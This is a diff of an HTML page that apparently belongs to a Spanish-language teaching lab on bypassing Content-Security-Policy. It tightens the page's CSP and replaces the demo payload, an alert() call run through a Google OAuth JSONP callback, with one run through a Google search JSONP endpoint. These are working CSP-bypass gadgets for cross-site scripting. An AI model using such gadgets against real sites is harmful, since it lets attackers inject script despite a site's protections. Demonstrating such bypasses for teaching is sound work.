@@ -21,7 +21,7 @@
   <link rel="stylesheet" href="../node_modules/@highlightjs/cdn-assets/styles/dark.min.css">
 
   
-  <meta id="csp" http-equiv="Content-Security-Policy" content="script-src &#39;self&#39; https://*.google.com https://*.gstatic.com https://cdn.jsdelivr.net/npm/jquery@3.6.4/dist/jquery.min.js;">
+  <meta id="csp" http-equiv="Content-Security-Policy" content="script-src &#39;self&#39; https://www.google.com https://*.gstatic.com https://cdn.jsdelivr.net/npm/jquery@3.6.4/dist/jquery.min.js;">
   
 
   <script src="js/darkmode.js"  defer></script>
@@ -32,7 +32,7 @@
   </title>
 
   
-<meta id="csp" http-equiv="Content-Security-Policy" content="script-src &#39;self&#39; https://*.google.com https://*.gstatic.com https://cdn.jsdelivr.net/npm/jquery@3.6.4/dist/jquery.min.js;">
+<meta id="csp" http-equiv="Content-Security-Policy" content="script-src &#39;self&#39; https://www.google.com https://*.gstatic.com https://cdn.jsdelivr.net/npm/jquery@3.6.4/dist/jquery.min.js;">
 <script src="js/csp.js"  defer></script>
 <script src="js/showpayload.js"  defer></script>
 
@@ -86,7 +86,7 @@
   </h2>
   <pre><code id="payload-content" class="language-html"></code></pre>
   <button id="inject">Inject</button>
-  <a href="05.html" role="button" class="secondary outline">Restart</a>
+  <a href="jsonp.html" role="button" class="secondary outline">Restart</a>
 </section>
 
 <section>
@@ -105,7 +105,7 @@
   <pre><code id="errors"></code></pre>
 </section>
 
-<template id="payload-template"><script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(document.domain)"></script></template>
+<template id="payload-template"><script src="https://www.google.com/complete/search?jsonp=alert(document.domain)//&client=chrome"></script></template>
 
 
 
@@ -113,7 +113,7 @@
   <nav>
     <ul>
       <li>
-        <a href="04.html" role="button" class="secondary outline" >
+        <a href="angularjs-fixed.html" role="button" class="secondary outline" >
           <i class="fa-solid fa-chevron-left"></i>
           anterior
         </a>
@@ -126,7 +126,7 @@
     </ul>
     <ul>
       <li>
-        <a href="06.html" role="button" class="secondary outline" >
+        <a href="jsonp-fixed.html" role="button" class="secondary outline" >
           siguiente
           <i class="fa-solid fa-chevron-right"></i>
         </a>
